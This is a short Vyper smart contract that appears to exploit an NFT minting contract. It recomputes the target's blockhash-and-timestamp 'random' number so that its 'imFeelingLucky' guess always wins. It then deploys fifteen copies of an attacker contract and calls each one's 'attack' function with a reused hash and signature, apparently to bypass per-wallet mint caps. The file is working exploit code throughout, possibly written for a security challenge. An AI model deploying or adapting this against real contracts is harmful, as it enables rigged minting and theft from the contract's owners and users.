# @version ^0.3.7

interface INFT:
    def MAX_WALLET() -> uint256: view
    def totalSupply() -> uint256: view
    def imFeelingLucky(
        to: address,
        qty: uint256,
        number: uint256,
    ): nonpayable

@external
@payable
def __init__(
    target: address, 
    nft: address, 
    hash: bytes32,
    signature: Bytes[65],
):
    INFT(nft).imFeelingLucky(
        msg.sender, 
        INFT(nft).MAX_WALLET(), 
        self._random_number(INFT(nft).totalSupply()),
    )
    for i in range(15):
        attacker_contract: address = create_copy_of(target, salt=convert(i, bytes32))
        raw_call(
            attacker_contract,
            _abi_encode(
                nft,
                hash,
                signature,
                method_id=method_id("attack(address,bytes32,bytes)")
            ),
        )

@internal
def _random_number(supply: uint256) -> uint256:
    return convert(
        keccak256(
            concat(
                blockhash(block.number - 1),
                convert(block.timestamp, bytes32),
                convert(supply, bytes32),
            )
        ),
        uint256,
    ) % 100
